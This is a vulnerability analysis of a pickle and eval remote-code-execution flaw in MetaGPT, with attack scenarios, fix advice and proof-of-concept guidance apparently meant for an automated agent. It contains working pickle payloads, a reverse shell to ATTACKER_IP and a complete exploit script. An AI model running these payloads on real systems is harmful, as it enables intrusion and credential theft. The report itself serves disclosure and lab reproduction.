# Vulnerability Analysis: CVE-2026-0760

## Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-0760 |
| **Title** | MetaGPT `deserialize_message` Deserialization of Untrusted Data → RCE |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **CVSS** | 9.8 Critical — CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **Affected Software** | MetaGPT v0.8.1 (all versions through HEAD) |

---

## Root Cause

The function `deserialize_message()` in `metagpt/utils/serialize.py` (line 75) calls Python's `pickle.loads()` directly on externally-supplied serialized byte data with **zero validation, sanitization, or use of a restricted unpickler**.

Python's `pickle` module is documented as **unsafe for untrusted data** because it can instantiate arbitrary Python objects during deserialization. An attacker can craft a pickle payload using the `__reduce__` protocol to execute arbitrary system commands or Python code at deserialization time — *before* any application-level validation runs.

**The root cause is the direct use of `pickle.loads()` on data that crosses a trust boundary.**

The vulnerable pattern:
```python
# metagpt/utils/serialize.py, line 74-75
def deserialize_message(message_ser: str) -> "Message":
    message = pickle.loads(message_ser)  # <-- ARBITRARY CODE EXECUTION
```

The `pickle.loads()` call executes before the return value is inspected, meaning any payload validation (type checks, Pydantic model validation) is irrelevant — code execution occurs during the `loads()` call itself.

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerability

| Field | Value |
|---|---|
| **File** | `metagpt/utils/serialize.py` |
| **Function** | `deserialize_message()` |
| **Line** | 75 |
| **Dangerous Call** | `pickle.loads(message_ser)` |
| **Input Parameter** | `message_ser: str` (actually bytes — the type hint is wrong) |

### Secondary Vulnerability (same file)

| Field | Value |
|---|---|
| **File** | `metagpt/utils/serialize.py` |
| **Function** | `actionoutput_str_to_mapping()` |
| **Line** | 56 |
| **Dangerous Call** | `eval(value)` |
| **Input** | `value` from mapping dict — user-controlled string values |

The `eval()` on line 56 is called when `value != "(<class 'str'>, Ellipsis)"`, executing arbitrary Python from the mapping's string representation. This is reachable via:
- `deserialize_message()` → line 79: `ic["mapping"]` values flow to `actionoutput_str_to_mapping()` after pickle deserialization (moot since pickle already gives RCE)
- `Message.__init__()` → `check_instruct_content` field validator (line 210): when a `Message` object is constructed from a dict with `instruct_content.mapping` — this is the **JSON deserialization path**

### Tertiary Vulnerability (schema.py)

| Field | Value |
|---|---|
| **File** | `metagpt/schema.py` |
| **Function** | `check_instruct_content()` (field_validator) |
| **Line** | 215 |
| **Dangerous Call** | `import_class(ic["class"], ic["module"])` |
| **Input** | `ic["class"]` and `ic["module"]` from user-controlled dict |

When `Message` is constructed from a dict where `instruct_content` has a `"module"` key, `import_class()` calls `importlib.import_module(module_name)` followed by `getattr(module, class_name)`. An attacker can specify `ic["module"] = "os"` and `ic["class"] = "system"` to obtain `os.system`, though the subsequent `ic_obj(**ic["value"])` call means the function is invoked as `os.system(**{"value": "cmd"})` — this doesn't directly map to RCE but the arbitrary import itself could be leveraged depending on what classes are importable.

### Additional eval() Instances

| File | Line | Function | Context |
|---|---|---|---|
| `metagpt/strategy/tot.py` | 66 | `generate` | `eval(thoughts)` — LLM response parsed and eval'd (indirect, requires LLM interaction) |

---

## Triggering Input

### Primary Vector: pickle.loads() RCE

The exact triggering input is a **crafted pickle byte stream** that uses the `__reduce__` protocol:

```python
import pickle
import os

class RCEPayload:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

payload = pickle.dumps(RCEPayload())
# payload is bytes, approximately 56 bytes long
```

When `deserialize_message(payload)` is called, `pickle.loads()` invokes `os.system("id > /tmp/pwned")` before returning.

**Alternative payload for reverse shell:**
```python
class RCEPayload:
    def __reduce__(self):
        return (os.system, ("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",))
```

**Alternative using subprocess for cleaner output capture:**
```python
import subprocess
class RCEPayload:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))
```

### Secondary Vector: eval() via JSON Message construction

Triggering input is a **JSON dict** passed to `Message()` constructor (or `Message.model_validate()`) with a malicious `instruct_content.mapping` value:

```python
malicious_message_dict = {
    "content": "test",
    "instruct_content": {
        "class": "test",
        "mapping": {
            "field1": "__import__('os').system('id > /tmp/pwned_eval')"
        },
        "value": {"field1": "test"}
    }
}
# When Message(**malicious_message_dict) is constructed:
#   check_instruct_content validator → actionoutput_str_to_mapping() → eval("__import__('os').system('id > /tmp/pwned_eval')")
```

---

## Attack Scenario

### Scenario 1: Redis Cache Poisoning (Network-Accessible)

1. **Prerequisites**: MetaGPT deployed with Redis memory backend (`aioredis`); Redis instance accessible to attacker (exposed on network, or via SSRF)
2. **Attack flow**:
   - Attacker connects to the Redis instance
   - Attacker writes a crafted pickle payload to a key matching MetaGPT's message cache pattern (e.g., `SET metagpt:user:chat <pickle_payload>`)
   - When MetaGPT reads and deserializes the cached message, `pickle.loads()` executes the attacker's code
3. **Impact**: Full RCE as the MetaGPT service user

### Scenario 2: Direct Function Call (Library Usage)

1. **Prerequisites**: Application imports and calls `deserialize_message()` with user-supplied data
2. **Attack flow**:
   - Attacker supplies crafted pickle bytes through any interface that feeds into `deserialize_message()`
   - Examples: file upload, API endpoint accepting serialized data, inter-process communication
3. **Impact**: Full RCE

### Scenario 3: JSON Message Construction (eval() path)

1. **Prerequisites**: Application constructs `Message` objects from user-supplied JSON/dict data
2. **Attack flow**:
   - Attacker supplies a JSON payload with malicious `instruct_content.mapping` values
   - The `check_instruct_content` field validator calls `actionoutput_str_to_mapping()`, which calls `eval()` on the mapping values
3. **Impact**: Full RCE via eval()

### Scenario 4: Shared Storage Poisoning

1. **Prerequisites**: MetaGPT serializes messages to shared storage (file system, database, S3)
2. **Attack flow**:
   - Attacker gains write access to the storage backend
   - Attacker replaces a serialized message with a crafted pickle payload
   - When MetaGPT loads the message, code execution occurs
3. **Impact**: Full RCE; persistence through storage

---

## Impact

| Impact Category | Severity | Description |
|---|---|---|
| **Confidentiality** | HIGH | Attacker can read any file accessible to the service, steal API keys (OpenAI, etc.), exfiltrate data |
| **Integrity** | HIGH | Attacker can modify files, inject code, tamper with LLM outputs |
| **Availability** | HIGH | Attacker can crash the service, delete data, consume resources |
| **Overall** | **Remote Code Execution** | Arbitrary command execution as the MetaGPT service user, no authentication required |

---

## Authentication Requirements

**None.** The vulnerability is pre-authentication.

- `deserialize_message()` accepts raw bytes and performs no authentication or authorization checks
- `pickle.loads()` executes before any application-level validation
- When MetaGPT is used as a library, there is no built-in authentication layer around the serialization functions
- The Redis backend (`metagpt/utils/redis.py`) connects with optional username/password, but if Redis is exposed without auth (common in dev/container environments), the attacker needs no credentials
- The `eval()` path through `Message(**dict)` also requires no authentication — it triggers during object construction

**For the PoC**: No authentication flow needed. The PoC directly calls `deserialize_message()` with a crafted payload.

---

## Fix Assessment

**No fix exists.** The vulnerability remains present and unpatched across all versions:

- **v0.8.1** (tagged 2024-04-22): Vulnerable — `pickle.loads()` on line 75
- **v0.8.2** (tagged 2025-03-03): Vulnerable — identical code
- **HEAD of main** (as of 2026-03-01): Vulnerable — identical code

The ZDI advisory (ZDI-26-026) recommends: *"Restrict interaction with the product."*

Since there is no fix to assess, no bypass analysis is needed. The vulnerability is fully exploitable on all available versions.

**What a proper fix would require:**
1. Replace `pickle.loads()` with a safe serialization format (JSON via Pydantic's `model_dump_json()` / `model_validate_json()`)
2. Replace `eval()` on line 56 with `ast.literal_eval()` or explicit type mapping
3. Sanitize the `import_class(ic["class"], ic["module"])` call in `check_instruct_content` with an allowlist of permitted module/class pairs
4. Remove all `pickle` usage from the codebase

---

## Escalation Path

The vulnerability's primary primitive is **arbitrary code execution** — this is already the highest-impact primitive. No escalation chain is needed.

However, from the RCE primitive, an attacker can:
1. **Steal LLM API keys** from MetaGPT config (`~/.metagpt/config2.yaml` or environment variables for OpenAI, Anthropic, etc.)
2. **Pivot to connected services** — Redis, databases, cloud provider metadata endpoints
3. **Establish persistence** by modifying MetaGPT source files or injecting a backdoor into the Python environment
4. **Exfiltrate proprietary data** — any documents, code, or conversations processed by MetaGPT

---

## Related Attack Surface

### 1. `eval()` in `actionoutput_str_to_mapping()` — `metagpt/utils/serialize.py:56`

```python
def actionoutput_str_to_mapping(mapping: dict) -> dict:
    new_mapping = {}
    for key, value in mapping.items():
        if value == "(<class 'str'>, Ellipsis)":
            new_mapping[key] = (str, ...)
        else:
            new_mapping[key] = eval(value)  # ARBITRARY CODE EXECUTION
    return new_mapping
```

Called from:
- `metagpt/schema.py:210` — `Message.check_instruct_content` field validator (JSON deserialization path)
- `metagpt/utils/serialize.py:79` — `deserialize_message()` post-pickle path (redundant since pickle already gives RCE)

### 2. `import_class()` with user-controlled arguments — `metagpt/schema.py:215`

```python
elif "module" in ic:
    ic_obj = import_class(ic["class"], ic["module"])  # ARBITRARY IMPORT
```

Allows importing arbitrary Python modules and accessing arbitrary attributes. While not directly RCE (the result is called with `**ic["value"]`), certain classes could be abused.

### 3. `eval()` in `metagpt/strategy/tot.py:66`

```python
thoughts = eval(thoughts)  # LLM response passed to eval
```

This is an indirect vector requiring LLM manipulation (prompt injection), but demonstrates a pattern of unsafe code execution throughout the codebase.

### 4. `import_class()` with user-controlled metadata — `metagpt/rag/engines/simple.py:246`

```python
obj_cls = import_class(node.metadata["obj_cls_name"], node.metadata["obj_mod_name"])
```

If RAG node metadata is attacker-controlled, this enables arbitrary module import.

---

## Build System

| Field | Value |
|---|---|
| **Language** | Python 3.9+ |
| **Build System** | setuptools (setup.py) |
| **Package Manager** | pip |
| **Package Name** | metagpt |
| **Version** | 0.8.1 |

---

## Build Commands

### Full Installation (from source)
```bash
pip install -r requirements.txt
pip install -e .
```

### Minimal Installation (for PoC — only needs pickle + pydantic)
```bash
pip install pydantic==2.6.4
```

Or for a completely standalone PoC that demonstrates the `pickle.loads()` vulnerability:
```bash
# No installation needed — uses only Python stdlib (pickle, os, subprocess)
```

---

## Dependencies

### Full Dependencies (requirements.txt)
| Package | Version | Required for PoC? |
|---|---|---|
| pydantic | ==2.6.4 | Only if testing Message model path |
| aioredis | ~=2.0.1 | Only if testing Redis path |
| aiohttp | ==3.8.6 | No |
| openai | ==1.6.1 | No |
| All others | Various | No |

### Minimal PoC Dependencies
- **Python 3.9+** (stdlib `pickle`, `os`, `subprocess` modules)
- **pydantic>=2.5.3** — only if importing MetaGPT's `Message` class or testing the JSON/eval path

---

## Runtime Requirements

### For standalone pickle PoC (recommended):
- Python 3.9+ interpreter
- No services, no configs, no network

### For full MetaGPT environment:
- Python 3.9-3.11
- Redis server (if testing Redis cache poisoning vector)
- No LLM API keys required (vulnerability is in serialization layer)

### Docker base image recommendation:
- **`python:3.9-slim`** — sufficient for the PoC
- Upstream uses `nikolaik/python-nodejs:python3.9-nodejs20-slim` but Node.js is not needed

### Lab Architecture:
The PoC can be structured in two tiers:

**Tier 1 — Direct Function Call (simplest)**:
- Single Python script that crafts a pickle payload and calls `deserialize_message()` (or raw `pickle.loads()`)
- Demonstrates RCE by executing `id`, writing a marker file, or capturing command output
- Requires only `metagpt` installed (or just the `serialize.py` file)

**Tier 2 — Redis Cache Poisoning (realistic attack scenario)**:
- Docker Compose with MetaGPT + Redis containers
- PoC script connects to Redis, injects malicious pickle payload
- MetaGPT reads from Redis and triggers deserialization
- More complex setup but demonstrates the real-world attack path

**Recommended**: Tier 1 is sufficient and most reliable. The vulnerability is trivially demonstrable without any service infrastructure.

---

## PoC Agent Guidance

### Recommended PoC Structure

```python
#!/usr/bin/env python3
"""CVE-2026-0760: MetaGPT deserialize_message() pickle RCE PoC"""

import pickle
import os
import subprocess
import tempfile

# Step 1: Craft malicious pickle payload using __reduce__
class RCEPayload:
    def __reduce__(self):
        # Write a marker file to prove arbitrary command execution
        return (os.system, ("id > /tmp/cve-2026-0760-proof.txt",))

payload = pickle.dumps(RCEPayload())

# Step 2: Import the vulnerable function and trigger deserialization
from metagpt.utils.serialize import deserialize_message

try:
    deserialize_message(payload)
except Exception:
    pass  # The pickle.loads() already executed before any exception

# Step 3: Verify RCE occurred
with open("/tmp/cve-2026-0760-proof.txt") as f:
    print(f"[+] RCE confirmed: {f.read().strip()}")
```

### Key Points for PoC Agent:
1. **Payload executes during `pickle.loads()`** — any exception after that is irrelevant
2. The `message_ser` parameter accepts `bytes` despite the `str` type hint
3. Use `os.system()` for simplicity or `subprocess.check_output()` for capturing output
4. The payload can be as simple as 56 bytes
5. For the `eval()` secondary vector, construct a `Message` object from a dict with malicious `instruct_content.mapping` values
6. Both vectors should be demonstrated to show the breadth of the attack surface
